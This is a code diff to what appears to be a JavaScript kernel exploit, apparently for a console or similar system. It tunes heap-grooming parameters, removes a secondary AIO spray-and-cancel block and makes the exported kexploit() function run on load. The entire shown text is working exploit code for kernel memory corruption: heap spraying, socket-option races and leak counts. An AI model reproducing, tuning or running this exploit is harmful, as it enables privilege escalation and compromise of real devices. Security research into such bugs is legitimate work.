@@ -133,7 +133,7 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 10;
+const num_alias = 100;
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
@@ -1640,18 +1640,7 @@ function setup(block_fd) {
     const greqs = make_reqs1(num_reqs);
     // allocate enough so that we start allocating from a newly created slab
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-    cancel_aios(groom_ids_p, num_grooms);
-    {
-        // chosen to maximize the number of 0x100 malloc allocs per submission
-        const num_reqs = 4;
-        const groom_ids = new View4(num_grooms);
-        const groom_ids_p = groom_ids.addr;
-        const greqs = make_reqs1(num_reqs);
-        // allocate enough so that we start allocating from a newly created slab
-        spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-        cancel_aios(groom_ids_p, num_grooms);
-    }
-        
+    cancel_aios(groom_ids_p, num_grooms);        
     return [block_id, groom_ids];
 }
 
@@ -1667,6 +1656,7 @@ function setup(block_fd) {
 //
 // the exploit implementation also assumes that we are pinned to one core
 export async function kexploit() {
+ 
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
@@ -1743,5 +1733,12 @@ export async function kexploit() {
     for (const sd of sds) {
         close(sd);
     }
+               
 }
+
 kexploit();
+
+
+    
+
+
